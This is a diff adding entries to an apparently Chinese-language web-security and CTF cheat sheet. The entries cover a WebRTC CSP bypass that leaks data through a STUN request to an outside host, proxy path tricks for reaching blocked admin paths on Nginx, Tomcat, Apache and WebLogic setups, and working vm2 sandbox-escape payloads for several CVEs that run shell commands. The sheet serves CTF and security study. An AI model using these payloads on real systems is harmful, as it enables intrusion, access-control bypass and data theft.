@@ -3894,7 +3894,23 @@ https://csp-evaluator.withgoogle.com/
     - ref: 
         - [pilvar's challenge](https://twitter.com/pilvar222/status/1784618120902005070)
         - [justCTF 2020 - BabyCSP](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points)
-
+- DNS prefetch
+    - `<link rel="dns-prefetch" href="https://data.example.com">`
+- WebRTC
+    - 嚴格 CSP，可以透過該方法將資料外傳
+        - 例如: `default-src 'none'; script-src 'unsafe-inline';`
+    - [WebRTC bypass CSP connect-src policies](https://github.com/w3c/webrtc-nv-use-cases/issues/35)
+    ```javascript
+    async function a(){
+        c={iceServers:[{urls:"stun:{{user.id}}.x.cjxol.com:1337"}]}
+        (p=new RTCPeerConnection(c)).createDataChannel("d")
+        await p.setLocalDescription()
+    }
+    a();
+    ```
+    - Example
+        - [SeikaiCTF 2023 - Golf Jail](https://blog.antoniusblock.net/posts/golfjail/)
+        - [corCTF 2023 - crabspace](https://blog.huli.tw/2023/09/02/corctf-sekaictf-2023-writeup/#crabspace-4-solves)
 ### Upload XSS
 
 - htm
@@ -4401,6 +4417,54 @@ state[i] = state[i-3] + state[i-31]`
     - 若將 4 bytes 的 utf8mb4 插入 utf8 中，在 non strict 模式下會被截斷
     - CVE-2015-3438 WordPress Cross-Site Scripting Vulnerability
 
+- Proxy 相關
+    - Path parameters
+        - Tomcat & Jetty: `/path;param/abcd` => `/path/abcd
+        - WebLogic & WildFly: `/path;param/abcd` => `/path`
+    - Nginx + Tomcat
+        - `..;`
+        - 情境: Nginx -> Tomcat, Nginx deny `/manager`
+            - `/docs/..;/manager/html`
+                - Nginx: `/docs/..;/manager/html`
+                - Tomcat: `/manager/html`
+        - 情境: Nginx -> Tomcat, Nginx deny `/console/` (`location ~* /console/`)
+            - `/..;/console;/flag`
+                - Nginx: `/..;/console;/flag`
+                - Tomcat: `/console/flag`
+    - Nginx + Apache
+        - 情境: Nginx -> Apache, Nginx deny `/admin`
+            - `proxy_pass http://apache` (No trailing slash，以原始資料送到後端)
+            - `/admin//../flag`
+                - Nginx: `/flag`
+                - Apache: `/admin/flag`
+    - Nginx + WebLogic
+        - 情境: Nginx -> WebLogic, Nginx deny `/console`
+            - `proxy_pass http://weblogic;`
+                - Nginx: `/`
+                - WebLogic: `/console`
+            - `/#/../console`
+    - Nginx + Gunicorn
+        - 繞黑名單規則
+            - Nginx deny `/admin`
+            - `/admin/key\x09HTTP/1.1/../../../`
+                - Nginx: `/` 
+                - Gunicorn: `/admin/key`
+            - Nginx 新版本已修復
+            - Example: 
+                - [CSAW 2021 - gatekeeping](https://lebr0nli.github.io/blog/security/nginx-gunicorn-CSAW2021/#exploit)
+                - [corCTF 2023 - pdf pal](https://blog.huli.tw/2023/09/02/corctf-sekaictf-2023-writeup/#pdf-pal-2-solves)
+    - Haproxy + Caddy
+        - Haproxy: `keep-alive` + `CONNECT` + 2xx status，會讓其處於 tunnel mode，不採用任何 rules
+        - Cadday: 用 normalized path 來 matching，但送出的卻不是 normalized path
+        - Example: [SecurityFest CTF 2022 - tunnelvision](https://blog.maple3142.net/2022/06/03/securityfest-ctf-2022-writeups/#tunnelvision)
+    - ref: https://github.com/GrrrDog/weird_proxies/tree/master
+- Gunicorn `SCRIPT_NAME`
+    - `SCRIPT_NAME` 可以改變 base path
+        - 當 `SCRIPT_NAME=test`，`/a/b/test/flag` => `/flag`
+    - gunicorn 的 `SCRIPT_NAME` 可以透過 HTTP Header 設定
+        - `SCRIPT_NAME: a`
+        - 前面如果有 Proxy，例如 Nginx，則要開啟 `underscores_in_headers` 才能允許 header 中的 `_`
+    - Example: [CSAW 2021 - gatekeeping](https://lebr0nli.github.io/blog/security/nginx-gunicorn-CSAW2021/#exploit)
 - Nginx internal繞過
     - `X-Accel-Redirect`
     - [Document](https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/)
@@ -4452,8 +4516,12 @@ state[i] = state[i-3] + state[i-31]`
     ```
     - Example
         - [Dragon CTF 2021 - webpwn](https://github.com/w181496/CTF/tree/master/dragonctf-2021)
-
-
+- Javascript Proxy 
+    - [doc](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Proxy)
+    - 嘗試取得被 Proxy 保護住的 flag: `var p = new Proxy({flag: window.flag || 'flag'}, { get: () => 'nope' }`
+    - 解法: `Object.getOwnPropertyDescriptor(p, 'flag')`
+    - Example
+        - [corCTF 2022 - sbxcalc](https://brycec.me/posts/corctf_2022_challenges#sbxcalc)
 - Node.js 目錄穿越漏洞
     - CVE-2017-14849
     - 影響: 8.5.0 版
@@ -4464,6 +4532,92 @@ state[i] = state[i-3] + state[i-31]`
     - CONFidence CTF 2020 - TempleJS
         - Only allow ```/^[a-zA-Z0-9 ${}`]+$/g```
         - ``` Function`a${`return constructor`}{constructor}` `${constructor}` `return flag` `` ```
+- Node.js vm2 escape
+    - CVE-2019-10761
+        - vm2 <= 3.6.10
+    - CVE-2021-23449
+        - vm2 <= 3.9.4
+        ```javascript
+        let res = import('./foo.js')
+        res.toString.constructor("return this")().process.mainModule.require("child_process").execSync("whoami").toString();
+        ```
+    - CVE-2023-29199
+        - vm2 <= 3.9.15
+        ```javascript
+        aVM2_INTERNAL_TMPNAME = {};
+        function stack() {
+            new Error().stack;
+            stack();
+        }
+        try {
+            stack();
+        } catch (a$tmpname) {
+            a$tmpname.constructor.constructor('return process')().mainModule
+                .require('child_process')
+                .execSync('echo "flag is here" > flag');
+        }
+        ```
+    - CVE-2023-30547
+        - vm2 <= 3.9.16
+        ```javascritp
+        err = {};
+        const handler = {
+            getPrototypeOf(target) {
+                (function stack() {
+                    new Error().stack;
+                    stack();
+                })();
+            }
+        };
+        const proxiedErr = new Proxy(err, handler);
+        try {
+            throw proxiedErr;
+        } catch ({constructor: c}) {
+            c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
+        }
+        ```
+    - CVE-2023-32314
+        - vm2 <= 3.9.17
+        ```javascript
+        const err = new Error();
+          err.name = {
+            toString: new Proxy(() => "", {
+              apply(target, thiz, args) {
+                const process = args.constructor.constructor("return process")();
+                throw process.mainModule.require("child_process").execSync("whoami").toString();
+              },
+            }),
+          };
+          try {
+            err.stack;
+          } catch (stdout) {
+            stdout;
+          }
+        ```
+    - CVE-2023-37466
+        - vm2 <= 3.9.19
+        ```javascript
+        async function fn() {
+            (function stack() {
+                new Error().stack;
+                stack();
+            })();
+        }
+        p = fn();
+        p.constructor = {
+            [Symbol.species]: class FakePromise {
+                constructor(executor) {
+                    executor(
+                        (x) => x,
+                        (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch 123'); }
+                    )
+                }
+            }
+        };
+        p.then();
+        ```
+    - vm2 is officially deprecated
+        - https://github.com/patriksimek/vm2/issues/533
 - Apache Tomcat Session 操縱漏洞
     - 預設 session 範例頁面 `/examples/servlets /servlet/SessionExample`
     - 可以直接對 Session 寫入
